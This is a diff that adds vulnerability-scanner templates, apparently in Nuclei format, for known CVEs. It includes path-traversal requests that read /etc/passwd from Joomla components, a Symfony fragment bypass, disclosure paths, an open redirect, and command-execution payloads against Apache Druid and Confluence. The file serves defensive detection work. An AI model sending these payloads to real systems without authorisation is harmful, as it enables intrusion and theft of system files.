@@ -794,6 +794,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1219",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JA News (com_janews) component 1.0 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_janews - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11757",
+          "https://www.cvedetails.com/cve/CVE-2010-1219"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_janews&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1304",
       "info": {
         "author": "daffainfo",
@@ -826,6 +863,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1305",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in jinventory.php in the JInventory (com_jinventory) component 1.23.02 and possibly other versions before 1.26.03, a module for Joomla!, allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component JInventory 1.23.02 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12065",
+          "https://www.cvedetails.com/cve/CVE-2010-1305"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -974,6 +1048,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_loginbox&view=../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1354",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the VJDEO (com_vjdeo) component 1.0 and 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component VJDEO 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12102",
+          "https://www.cvedetails.com/cve/CVE-2010-1354"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -1423,6 +1534,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1717",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the iF surfALERT (com_if_surfalert) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component iF surfALERT 1.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12291",
+          "https://www.cvedetails.com/cve/CVE-2010-1717"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_if_surfalert&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1718",
       "info": {
         "author": "daffainfo",
@@ -1677,6 +1825,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_datafeeds&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1980",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in joomlaflickr.php in the Joomla Flickr (com_joomlaflickr) component 1.0.3 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Joomla! Flickr 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12085",
+          "https://www.cvedetails.com/cve/CVE-2010-1980"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -4686,6 +4871,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}/pages/setup.php?defaultlanguage=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-4050",
+      "info": {
+        "author": "ELSFA7110,meme-lord",
+        "description": "FragmentListener in the HttpKernel component in Symfony 2.3.19 through 2.3.28, 2.4.9 through 2.4.10, 2.5.4 through 2.5.11, and 2.6.0 through 2.6.7, when ESI or SSI support enabled, does not check if the _controller attribute is set, which allows remote attackers to bypass URL signing and security rules by including (1) no hash or (2) an invalid hash in a request to /_fragment.",
+        "name": "ESI unauthorized access",
+        "reference": [
+          "https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access",
+          "https://nvd.nist.gov/vuln/detail/CVE-2015-4050"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2015,symfony,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "PHP Credits"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
           ]
         }
       ]
@@ -11303,6 +11526,47 @@
       ]
     },
     {
+      "id": "CVE-2018-8719",
+      "info": {
+        "author": "LogicalHunter",
+        "description": "Access to wp-content/uploads/wp-security-audit-log/* files is not restricted. For example, these files are indexed by Google and allows for attackers to possibly find sensitive information",
+        "name": "WordPress Plugin WP Security Audit Log 3.1.1 - Information Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/44371",
+          "https://vuldb.com/?id.115817",
+          "https://www.cvedetails.com/cve/CVE-2018-8719/"
+        ],
+        "severity": "medium",
+        "tags": "wordpress,wp-plugin,cve,cve2018,exposure"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "[TXT]",
+                ".log",
+                "Index of"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/uploads/wp-security-audit-log/failed-logins/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-8770",
       "info": {
         "author": "princechaddha",
@@ -13191,6 +13455,47 @@
             "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0\nAccept-Language: en-US,en;q=0.9\n"
           ],
           "threads": 50
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-17503",
+      "info": {
+        "author": "LogicalHunter",
+        "description": "An unauthenticated user can access /osm/REGISTER.cmd (aka /osm_tiles/REGISTER.cmd) directly _ it contains sensitive information about the database through the SQL queries within this batch file",
+        "name": "Kirona Dynamic Resource Scheduling - information disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/47498",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-17503"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2019,exposure"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DEBUGMAPSCRIPT=TRUE",
+                "@echo off"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/osm/REGISTER.cmd",
+            "{{BaseURL}}/osm_tiles/REGISTER.cmd"
+          ]
         }
       ]
     },
@@ -22460,6 +22765,34 @@
       ]
     },
     {
+      "id": "CVE-2021-24288",
+      "info": {
+        "author": "0x_Akoko",
+        "description": "When using acymailing to subscribe to a newsletter, you make a POST request with various parameters. Turning that to a GET request and adding the parameters as GET parameters, you can successfully go through with the subscription.",
+        "name": "AcyMailing < 7.5.0 - Open Redirect",
+        "reference": "https://wpscan.com/vulnerability/56628862-1687-4862-9ed4-145d8dfbca97",
+        "severity": "medium",
+        "tags": "wordpress,cve,cve2021,redirect,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "regex": [
+                "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com.*$"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://example.com&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24291",
       "info": {
         "author": "geeknik",
@@ -23039,6 +23372,46 @@
           "matchers-condition": "and",
           "raw": [
             "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/json\nContent-Length: 1006\nConnection: close\n\n{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\",\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"/etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\":{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n            },\n            \"dimensionsSpec\":{\n\n            },\n            \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\",\n            \"\":{\n               \"enabled\":\"true\"\n            }\n         }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26084",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
+        "name": "Confluence Server Webwork OGNL injection",
+        "reference": [
+          "https://jira.atlassian.com/browse/CONFSERVER-67940.",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-26084"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,confluence"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "inet",
+                "inet6",
+                "netmask"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nqueryString=aaaaaaaa\\u0027%2b{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var+isWin+%3d+java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022)%3b+var+cmd+%3d+new+java.lang.String(\\u0022ifconfig\\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\\u0022cmd.exe\\u0022,+\\u0022/c\\u0022,+cmd)%3b+}+else{p.command(\\u0022bash\\u0022,+\\u0022-c\\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\\u0022\\u0022%3b+var+output+%3d+\\u0022\\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\\u0027)}%2b\\u0027\n"
           ]
         }
       ]
